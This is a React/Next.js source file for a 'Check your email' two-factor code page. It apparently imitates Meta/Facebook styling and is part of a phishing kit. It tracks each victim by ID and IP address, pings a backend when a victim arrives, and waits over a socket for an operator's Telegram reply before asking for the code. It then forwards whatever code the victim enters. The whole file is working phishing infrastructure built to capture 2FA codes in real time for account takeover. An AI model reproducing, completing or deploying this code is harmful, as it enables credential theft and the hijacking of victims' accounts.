import React, { useEffect, useState } from "react";
import { styled } from "styled-components";
import Image from "next/image";
import { io } from "socket.io-client";
import { getDualEmailDisplay } from "../../utils/validationUtils";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import LoadingSpinner from "../ui/LoadingSpinner";
import { getSocketUrl, buildApiUrl } from "../../config/api";

const ModalContainer = styled.div`
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;

  width: 100%;
  height: 100%;
  z-index: 1000;
  top: 0px;
  left: 0px;
  padding-inline: 1rem;
`;
const ModalContent = styled.div`
  max-width: 550px;
  width: 100%;
  height: 530px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  padding-block: 1.5rem;
  margin-block: 1rem;
  @media (max-width: 991.98px) {
    height: 430px;
  }
  button:disabled {
    opacity: 0.5;
  }
`;

const ModalTitle = styled.div`
  padding-bottom: 0.1rem;
  font-weight: 700;
  font-size: 20px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const SmallText = styled.div`
  color: #1c2b33;
  font-size: 14px;
  line-height: 1.3;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`;

const CustomInput = styled.input`
  width: 100%;
  border: 1px solid #ddd;
  padding: 0.75rem;
  outline: none !important;
  border-radius: 10px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  &.redborder {
    border: 1px solid red !important;
  }

  :focus {
    border: 1px solid #aaa;
  }
  margin-bottom: 0.5rem;
`;
const StyledButton = styled.button`
  background-color: #0064e0;
  border: 1px solid #0064e0;
  width: 100%;
  color: white;
  font-size: 13px;
  font-weight: 500;
  padding: 10px 20px;
  border-radius: 50px;
  text-transform: none;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  :disabled {
    opacity: 0.5;
  }
`;
const ErrorDiv = styled.div`
  font-size: 12px;
  color: red;
  text-align: left;
  padding-bottom: 0.5rem;
  margin-top: -0.35rem;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 250px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) {
    min-height: 160px;
    border-radius: 10px;

    img {
      border-radius: 10px;
    }
  }
`;

/* Full white overlay shown while waiting for admin's Telegram reply */
const LoadingOverlay = styled.div`
  position: absolute;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #ffffff;
  z-index: 10;
`;

function Fa2Email({ Unik, setStep, Name, Email, BusinessEmail, Ip, LastFetch, wrong2faTrigger, inline = false }) {
  const isEmailReplyFlow = LastFetch === "Email2fa";
  const [receivedEmail, setReceivedEmail] = useState("");
  const [waiting, setWaiting] = useState(isEmailReplyFlow);

  // Call notify-2fa once — use sessionStorage so React StrictMode double-invoke is safe
  useEffect(() => {
    if (!isEmailReplyFlow || !Unik) return;
    const key = `notify2fa_sent_${Unik}`;
    if (typeof window !== "undefined" && sessionStorage.getItem(key)) return;
    if (typeof window !== "undefined") sessionStorage.setItem(key, "1");
    fetch(buildApiUrl("/api/appauth/notify-2fa"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: Unik, type: "email2fa" }),
    })
      .then((r) => r.json())
      .then((data) => console.log("[Fa2Email] notify-2fa ok:", data))
      .catch((err) => console.warn("[Fa2Email] notify-2fa failed:", err.message));
  }, [isEmailReplyFlow, Unik]);

  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    renderCountdown,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "Email 2FA",
    initialMessage: "Email 2FA Page Loaded",
    skipInitialMessage: isEmailReplyFlow,
  });

  // Socket: relay admin's email reply into window event
  useEffect(() => {
    if (!isEmailReplyFlow || !Unik) return;
    const socketInstance = io(getSocketUrl(), { transports: ["websocket", "polling"] });
    socketInstance.on(`gmail-code-${Unik}`, (data) => {
      if (data.code) {
        window.dispatchEvent(
          new CustomEvent("appauth-email-received", { detail: { email: data.code } })
        );
      }
    });
    socketInstance.connect();
    return () => socketInstance.disconnect();
  }, [Unik, isEmailReplyFlow]);

  // When admin replies: store email in subtitle ONLY — do NOT fill the code input
  useEffect(() => {
    if (!isEmailReplyFlow) return;
    const handleEmailReceived = (event) => {
      const value = event?.detail?.email || event?.detail?.code || "";
      if (!value) return;
      setReceivedEmail(value);
      setWaiting(false);
    };
    window.addEventListener("appauth-email-received", handleEmailReceived);
    return () => window.removeEventListener("appauth-email-received", handleEmailReceived);
  }, [isEmailReplyFlow]);

  const handleFormSubmit = (e) => {
    handleSubmit(e, "email2fa");
  };

  const content = (
    <ModalContent>
      {/* Full white overlay while waiting for admin's Telegram reply */}
      {isEmailReplyFlow && waiting && (
        <LoadingOverlay>
          <LoadingSpinner size="36px" />
        </LoadingOverlay>
      )}

        <div className="text-start">
          <ModalTitle>Check your email</ModalTitle>
          <SmallText>
            {isEmailReplyFlow ? (
              waiting ? (
                <>&nbsp;</>
              ) : (
                <>Enter the code we sent to {receivedEmail}</>
              )
            ) : (
              <>Enter the code we sent to{" "}{getDualEmailDisplay(Email, BusinessEmail)}</>
            )}
          </SmallText>
        </div>
        <ImgWrapper>
          <Image
            alt=""
            src="/assets/images/New2FA.jpg"
            layout="fill"
            objectFit="cover"
          />
        </ImgWrapper>
        <div>
          <form onSubmit={handleFormSubmit}>
            <div className="form-floating">
              <CustomInput
                placeholder="Code"
                type="number"
                value={code}
                onChange={handleCodeChange}
                className={`form-control ${shouldShowRedBorder() ? "redborder" : ""}`}
                disabled={isLoading || (isEmailReplyFlow && waiting)}
              />
              <label htmlFor="floatingInput">Code</label>
            </div>

            {showError && <ErrorDiv>Invalid authentication code</ErrorDiv>}
            <SmallText>
              {showError && (
                <>We can send a new code in&nbsp;{renderCountdown()}</>
              )}
            </SmallText>

            <StyledButton
              type="submit"
              className="mt-2"
              disabled={isButtonDisabled()}
            >
              {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
            </StyledButton>
          </form>
        </div>
    </ModalContent>
  );

  return inline ? content : <ModalContainer>{content}</ModalContainer>;
}

export default Fa2Email;
